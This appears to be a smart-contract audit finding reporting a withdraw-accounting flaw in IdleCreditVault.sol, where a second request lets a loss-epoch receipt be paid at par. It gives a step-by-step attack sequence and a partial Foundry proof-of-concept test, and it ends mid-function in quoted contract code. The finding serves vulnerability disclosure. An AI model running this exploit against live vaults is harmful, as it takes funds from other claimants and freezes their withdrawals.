### Title
Loss-adjusted withdraw receipt escapes the haircut and is paid at par when a second request overwrites `lastWithdrawRequest` - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault` tracks a user's loss-adjusted claim epoch via a single scalar `lastWithdrawRequest[_user]`. A new `requestWithdraw` overwrites this marker, so a receipt created in a `stopEpochWithDuration(_lossAmount)` epoch is no longer routed through `_claimLossAdjustedWithdrawRequest` (which applies `lossRecoveryPriceByEpoch`) and instead falls into `_claimFundedWithdrawRequest`, which pays the aggregate `withdrawsRequests[_user]` at par. This is a structural analog of the dset check bypass: the guard validates only the "top-level" key (the latest epoch marker) while a crafted earlier entry survives untouched in the per-epoch mapping.

### Finding Description
In `requestWithdraw`, every request sets `lastWithdrawRequest[_user] = currentEpoch` and accumulates both `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][currentEpoch]`. [1](#0-0) 

On claim, `_claimLossAdjustedWithdrawRequest` looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`. Because only the *latest* request epoch is consulted, an earlier loss-epoch receipt is never found when the marker was overwritten. [2](#0-1) 

The stale per-epoch amount is never cleared: `withdrawsRequestsByEpoch[_user][lossEpoch]` and the aggregate `withdrawsRequests[_user]` still hold the full pre-haircut basis. `_claimFundedWithdrawRequest` then pays `normalAmount = withdrawsRequests[_user]` in full once `epochNumber > lastWithdrawRequest[_user]`, burning receipt tokens 1:1 and transferring the entire basis. [3](#0-2) 

Attack sequence:
1. Epoch N running: attacker calls `requestWithdraw` → `withdrawsRequestsByEpoch[user][N] = X`, `lastWithdrawRequest[user] = N`, `pendingWithdraws += X`.
2. Epoch ends with a partial loss via `stopEpochWithDuration(_lossAmount)`. The borrower funds only `X * lossRecoveryPriceByEpoch[N]`; `pendingWithdraws` is cleared for the loss-adjusted amount only.
3. Epoch N+1 buffer: attacker calls `requestWithdraw` again for amount `Y` → `lastWithdrawRequest[user] = N+1`. The epoch-N receipt basis `X` remains in `withdrawsRequests`/`withdrawsRequestsByEpoch` untouched.
4. After epoch N+1 stops, `claimWithdrawRequest` runs: `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[N+1] == 0` and returns 0 (loss-epoch N receipt bypassed). `_claimFundedWithdrawRequest` pays `X + Y` at par while the vault only received `X * price + Y` for those receipts.

### Impact Explanation
The attacker extracts `(1 - lossRecoveryPrice/RECOVERY_FULL) * X` more than funded. The vault pays the pre-haircut amount out of funds belonging to other claimants, so subsequent honest `claimWithdrawRequest`/`claimInstantWithdrawRequest` calls revert on insufficient balance — direct theft plus permanent freezing of remaining unclaimed withdrawals, proportional to the haircut and the attacker's receipt size (up to the whole pending-withdraw bucket in a severe loss epoch). `_transferFundedClaim`'s reserve guard only protects the default-recovery reserve, not this shortfall. [4](#0-3) 

### Likelihood Explanation
Requires an epoch ending via `stopEpochWithDuration` with nonzero loss (an in-scope flow), plus a second withdraw request in a later epoch — all unprivileged user actions with no timing constraints beyond normal epoch progression. Any tranche holder can perform it; no privileged cooperation needed.

### Recommendation
Do not key the loss-adjusted claim solely on `lastWithdrawRequest[_user]`. Either iterate/scan `withdrawsRequestsByEpoch` for epochs with a nonzero `lossRecoveryPriceByEpoch` before the funded path, store a per-user loss-epoch list, or clear/reduce `withdrawsRequestsByEpoch[user][lossEpoch]` (and the aggregate) at `stopEpochWithDuration` so the unfunded haircut remainder cannot be claimed at par.

### Proof of Concept
Foundry fork PoC (setup mirrors `test/foundry/IdleCreditVault.t.sol`):

```solidity
function testLossReceiptBypassesHaircut() external {
    // deposit, burn tranche tokens into strategy receipts as in existing tests
    uint256 amount = 10000 * ONE_SCALE;
    idleCDO.depositAA(amount);
    _transferBurnedTrancheTokens(address(this), true);

    // epoch N: request withdraw of X
    uint256 reqN = cdoEpoch.requestWithdraw(IERC20(AAtranche).balanceOf(address(this)) / 2, address(AAtranche));
    _startEpochAndCheckPrices(N);

    // manager stops epoch with a loss via stopEpochWithDuration: borrower funds only X * lossPrice
    uint256 loss = reqN / 4; // 25% loss
    deal(defaultUnderlying, borrower, /* funded = reqN - loss + interest */);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(loss); // sets lossRecoveryPriceByEpoch[N] = 0.75e18

    // epoch N+1 buffer: second request overwrites lastWithdrawRequest
    _depositWithUser(user1, amount, true); // keep pool solvent elsewhere
    uint256 reqN1 = cdoEpoch.requestWithdraw(IERC20(AAtranche).balanceOf(address(this)), address(AAtranche));
    _startEpochAndCheckPrices(N + 1);
    _stopEpochAndCheckPrices(N + 1, apr, fundsEnd); // normal stop

    // claim: loss-adjusted path sees lossRecoveryPriceByEpoch[N+1] == 0 and skips epoch-N receipt
    uint256 balPre = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(address(this)) - balPre;

    // attacker received reqN at PAR instead of reqN * 0.75
    assertEq(paid, reqN + reqN1);           // overpayment of `loss`
    // subsequent honest claimant reverts NotAllowed / insufficient balance
}
```

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }

  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
